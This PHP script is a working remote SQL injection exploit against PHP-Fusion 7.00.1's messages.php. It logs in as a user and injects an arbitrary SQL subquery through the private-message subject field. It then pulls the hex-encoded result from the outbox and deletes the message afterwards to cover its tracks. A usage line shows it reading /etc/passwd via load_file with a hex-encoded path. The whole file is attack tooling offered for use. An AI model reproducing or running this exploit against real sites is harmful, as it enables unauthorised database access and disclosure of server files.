<?php
/*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
 PHP-Fusion 7.00.1 (messages.php) Remote SQL Injection Exploit
 requires magic_quotes == off

 coded by irk4z[at]yahoo.pl
 homepage: http://irk4z.wordpress.com

 greets: all friends ;)
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*/

$host = $argv[1];
$path = $argv[2];
$login = $argv[3];
$pass = $argv[4];
$sql_injection = $argv[5];

echo
"*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n".
" PHP-Fusion 7.00.1 (messages.php) Remote SQL Injection Exploit\n".
" requires magic_quotes == off\n".
"\n".
" coded by irk4z[at]yahoo.pl\n".
" homepage: http://irk4z.wordpress.com\n".
"\n".
" greets: all friends ;)\n".
"*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n";

if(empty($host) || empty($path) || empty($login) || empty($pass) || empty($sql_injection) ){
	echo "Usage: php $argv[0] <host> <path> <login> <pass> <SQL>\n" .
		 "       php $argv[0] localhost /php-fusion/ user s3cret \"SELECT database()\"\n".
		 "       php $argv[0] localhost / user s3cret \"SELECT load_file(0x2F6574632F706173737764)\"\n\n";
	die;
}

echo "Logging into system...";
//login to php-fusion using login and pass
$login_data = send($host, array(	"path" => $path."news.php",
					"post" => array(
							"user_name" => $login,
							"user_pass" => $pass,
							"login" => "Login"
							)
				)
			);

//get cookies
preg_match_all("/Set-Cookie:[\s]+([a-z_A-Z0-9]+=[a-z_A-Z0-9\.]+;)/", $login_data, $matches);
$cookies = implode(' ', $matches[1]);

//get user id
preg_match_all("/([0-9])+.([a-zA-Z0-9]{32})/", $cookies, $matches);
$my_id = $matches[1][0];

if(empty($my_id)){
	echo "\n[x] Incorrect login or password..";
	die;
} else {
	echo "[ok]\n";
}

$id_message = uniqid();
$inhex = '';
for($i = 0; $i < strlen($id_message); $i++) $inhex .= dechex( ord($id_message[$i]) ) ;

echo "Running sql-injection...\n";
//running sql-injection
$res = send($host, array(	"path" => $path."messages.php?msg_send={$my_id}%27%2F%2Axxx&",
				"cookie" => $cookies,
				"post" => array(
						"send_message" => 'X',
						"subject" => "X*/,0x{$inhex},								(SELECT/**/concat(0x{$inhex}{$inhex},hex(($sql_injection)),0x{$inhex}{$inhex})),0x79,1,1226787120,1)/*",
						"message" => "XXX"
						)
			)
		);

echo "Getting data...\n\n";
$res = send($host, array(	"path" => $path."messages.php?folder=outbox",
				"cookie" => $cookies )
			);

preg_match_all("/msg_read=([0-9]+)'>{$id_message}<\/a>/", $res, $matches);
$id_message_number = $matches[1][0];

$res = send($host, array(	"path" => $path."messages.php?folder=outbox&msg_read=".$id_message_number,
				"cookie" => $cookies )
		);

preg_match_all("/{$id_message}{$id_message}(.*){$id_message}{$id_message}/", $res, $matches);

if( empty($matches[1][0]) ){
	echo "[x] Failed... maybe SQL-INJ is incorrect?\n\n";
} else {
	$tmp = '';
	$hex = $matches[1][0];
	//unhex it!
	for($i = 0; $i < strlen($hex); $i+=2) $tmp .= chr(hexdec($hex[$i] . $hex[$i+1]));
	echo "DATA: \n".$tmp."\n\n";
}

echo "Deleting message...\n";

$res = send($host, array(	"path" => $path."messages.php?folder=outbox&msg_id=".$id_message_number,
				"cookie" => $cookies,
				"post" => array (
						"delete" => "Delete"
						)
			)
		);

//send http packet
function send($host, $dane = "") {
	$packet = (empty($dane['post']) ? "GET" : "POST") . " {$dane["path"]} HTTP/1.1\r\n";
	$packet .= "Host: {$host}\r\n";
	
	if( !empty($dane['cookie']) ){
		$packet .= "Cookie: {$dane['cookie']}\r\n";
	}
	
	if( !empty($dane['post']) ){
		$reszta_syfu = "";
		foreach($dane['post'] as $tmp => $tmp2){
			$reszta_syfu .= $tmp . "=" . $tmp2 . "&";
		}
		$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$packet .= "Connection: Close\r\n";
		$packet .= "Content-Length: ".strlen($reszta_syfu)."\r\n\r\n";
		$packet .= $reszta_syfu;
	} else {
		$packet .= "Connection: Close\r\n\r\n";
	}

	$o = @fsockopen($host, 80);
	if(!$o){
		echo "\n[x] No response...\n";
		die;
	}
	fputs($o, $packet);
	while (!feof($o)) $ret .= fread($o, 1024);
	fclose($o);
	return ($ret);
}

?>

